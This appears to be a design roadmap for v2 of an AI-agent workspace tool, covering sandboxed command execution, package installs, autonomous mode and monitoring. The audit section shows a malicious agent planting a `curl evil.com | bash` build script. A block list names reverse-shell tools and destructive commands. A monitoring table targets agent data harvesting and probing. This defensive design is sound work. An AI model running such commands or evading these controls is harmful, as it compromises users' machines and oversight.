# J41 Workspace v2 Roadmap

> **Prerequisite:** v1 must be deployed and battle-tested before v2 work begins. v1 = read + write + supervised/standard + Docker default.

## What v2 Adds

Everything deferred from the v1 design. Command execution, package installation, autonomous mode, binary files, dashboard live streaming.

---

## 1. Command Execution (`--commands` flag)

### The Problem From v1 Audit

Commands like `npm run build` execute arbitrary scripts from `package.json`. A malicious agent can:
1. `write_file("package.json", {"scripts": {"build": "curl evil.com | bash"}})`
2. `run_command("npm run build")`

Both pass the whitelist. The write passes SovGuard (it's valid JSON). The command passes the whitelist (npm run build is allowed).

### v2 Solution

**`--commands` requires either `--supervised` or `--docker` (enforced, not recommended).**

- With `--supervised`: buyer approves each command before execution. They can see what `npm run build` will actually run by checking package.json.
- With `--docker`: commands execute inside a network-isolated container. Even if the script tries `curl evil.com`, it can't reach the network.
- `--commands --standard --no-docker` is rejected by the CLI with an error explaining why.

### New MCP Tool

```
run_command(command: string) → { stdout, stderr, exitCode }
```

- Command checked against whitelist + buyer's `--allow` list
- In supervised mode: buyer sees the command and approves
- In Docker mode: command runs inside the container with `--network=none`
- Timeout: 5 minutes per command (configurable)
- Output streamed back to agent and shown in buyer's CLI

### Default Whitelist

| Category | Commands |
|----------|----------|
| Build | `npm run build`, `yarn build`, `make`, `cargo build`, `go build` |
| Test | `npm test`, `yarn test`, `pytest`, `go test`, `cargo test`, `jest`, `vitest` |
| Lint | `eslint`, `prettier`, `rustfmt`, `black`, `flake8`, `cargo clippy` |
| Git (read-only) | `git status`, `git diff`, `git log`, `git branch` |
| Info | `node --version`, `python --version`, `cat package.json` |

### Always-Blocked Patterns

```
rm -rf, rm -r /
curl | bash, wget | sh, eval
nc, ncat, socat, ssh, scp, rsync (to remote)
kill, pkill, killall
chmod 777, chown, sudo, su
Reverse shell patterns (regex detection)
```

### Custom Allowed Commands

Buyer adds in dashboard:
```
Allowed custom commands (one per line):
┌──────────────────────────────┐
│ npm run dev                  │
│ npm run storybook            │
│ python scripts/validate.py   │
└──────────────────────────────┘
```

Baked into CLI command as `--allow "npm run dev" --allow "npm run storybook"`.

### SovGuard Command Scanning

New SovGuard scan mode: command strings scanned at the relay level (not local — commands are not private data like file contents). Catches obfuscated malicious commands that bypass the whitelist regex.

---

## 2. Package Installation (`--install` flag)

### Requirements

- Agent trust tier must be Medium or higher
- Docker mode required (`--docker` enforced)
- Buyer must explicitly check the "Install packages" box

### What It Allows

- `npm install`, `yarn add`, `pip install`
- Modifications to `package.json`, `requirements.txt`, `Cargo.toml`
- `postinstall` scripts execute inside the Docker container (network-isolated)

### What It Blocks

- Global installs (`npm install -g`) — rejected
- System package managers (`apt`, `brew`, `yum`) — rejected
- Registry changes (`.npmrc` modifications pointing to malicious registries) — rejected

### Registry Restriction

v2 could enforce a registry whitelist:
- npm: only `registry.npmjs.org`
- pip: only `pypi.org`
- cargo: only `crates.io`

Custom registries require buyer override.

---

## 3. Autonomous Mode

### What Changes

Standard mode + command execution + package install. Agent works with minimal buyer intervention.

### Availability Gate

| Requirement | Why |
|---|---|
| Agent trust tier Medium+ | Proven track record |
| Docker mode required | OS-level isolation for commands |
| Buyer explicit opt-in | Must check "Autonomous" radio |
| Warning shown for Low trust | "This agent has limited history — consider supervised mode" |

### Behavioral Monitoring (Enhanced)

Autonomous mode adds stricter behavioral monitoring at the relay:

| Pattern | Response |
|---------|----------|
| Agent reads >100 files without writing any | Alert buyer: "possible data harvesting" |
| Agent writes to >50 files in <1 minute | Throttle: pause for buyer confirmation |
| Agent runs >10 commands in <1 minute | Rate limit: queue commands |
| Agent install command fails 3x in a row | Alert buyer: "possible probing" |
| SovGuard flags 2+ operations in a session | Auto-downgrade to supervised mode |

---

## 4. Binary File Support

### What Changes

v1 rejects binary files. v2 handles them.

### Implementation

New MCP tools:
```
read_binary(path) → base64-encoded content + MIME type
write_binary(path, base64Content, mimeType) → success
```

### Restrictions

- Max binary file size: 25MB (same as job file uploads)
- Allowed MIME types: images (png, jpg, gif, svg, webp), fonts (woff, woff2, ttf), PDFs
- Blocked: executables, archives, disk images, scripts disguised as binaries
- SovGuard scans binary metadata (not content — binary scanning is meaningless for text-based scanners)
- File magic bytes validated (actual type must match declared MIME type)

---

## 5. Dashboard Live Operation Stream

### What Changes

v1 shows workspace status (active/paused, operation counts). v2 streams every operation to the dashboard in real-time.

### Implementation

- Socket.IO channel: `workspace:${sessionId}`
- Events: `op:read`, `op:write`, `op:command`, `op:blocked`
- Each event includes: timestamp, operation type, path, SovGuard score, approved/blocked
- File content NOT streamed to dashboard (privacy) — only metadata
- Write operations include a diff preview (first 50 lines)
- Command operations include stdout/stderr (first 200 lines)

### UI

Live feed panel on JobDetailPage (same as designed in v1 spec but not built):

```
┌─────────────────────────────────────────────────┐
│ Workspace Live Feed              [Pause] [Abort]│
│                                                  │
│ 14:23:01  READ   src/App.jsx                    │
│ 14:23:03  READ   src/components/Header.jsx      │
│ 14:23:05  WRITE  src/components/Header.jsx      │
│           +  <nav className="responsive-nav">   │
│           -  <nav className="nav">              │
│ 14:23:08  CMD    npm test                       │
│           → 12 passed, 0 failed                 │
│ 14:23:15  WRITE  src/App.jsx                    │
│           ⚠ SovGuard: held for review           │
│                                                  │
│ Supervised: [Approve] [Reject]                   │
└─────────────────────────────────────────────────┘
```

---

## 6. Standalone Binary (No Node Required)

### What Changes

v1 requires Node.js (`yarn global add @j41/workspace`). v2 offers a compiled binary.

### Implementation Options

| Option | Pros | Cons |
|--------|------|------|
| **pkg** (Node → binary) | Same codebase, easy | Large binary (~50MB), Node bundled |
| **Bun compile** | Fast, smaller binary | Bun compatibility concerns |
| **Rust rewrite** | Small binary, fast, secure | Separate codebase to maintain |
| **Go rewrite** | Small binary, easy cross-compile | Separate codebase |

### Recommendation

Start with **pkg** or **Bun compile** — same TypeScript codebase, no maintenance burden. Distribute via GitHub Releases with checksums and signed artifacts.

```bash
# macOS
curl -L https://github.com/autobb888/j41-workspace/releases/latest/download/j41-workspace-macos -o j41-workspace
chmod +x j41-workspace

# Linux
curl -L https://github.com/autobb888/j41-workspace/releases/latest/download/j41-workspace-linux -o j41-workspace
chmod +x j41-workspace
```

---

## v2 Permission Matrix (Complete)

| Permission | Supervised | Standard | Autonomous |
|---|---|---|---|
| Read files | Always on | Always on | Always on |
| Write files | Buyer approves each | Free within sandbox | Free within sandbox |
| Run commands | Buyer approves each | Blocked | Whitelisted + allowed (Docker required) |
| Install packages | Buyer approves each | Blocked | Buyer checks box + trust Medium+ + Docker |
| Binary files | Buyer approves each | Free within type restrictions | Free within type restrictions |

## v2 Flag Reference

```bash
j41-workspace ./my-project --uid <token> \
  --read --write \
  --commands \
  --install \
  --allow "npm run dev" \
  --allow "python scripts/validate.py" \
  --supervised | --standard | --autonomous \
  --docker | --no-docker \
  --resume <reconnect-token>
```

## Implementation Order

1. **Command execution** — highest demand, enables build/test workflows
2. **Dashboard live stream** — improves buyer experience significantly
3. **Autonomous mode** — requires command execution + behavioral monitoring
4. **Binary file support** — specific use cases (frontend, design work)
5. **Package installation** — most dangerous, needs Docker enforcement proven
6. **Standalone binary** — widens audience, can happen anytime
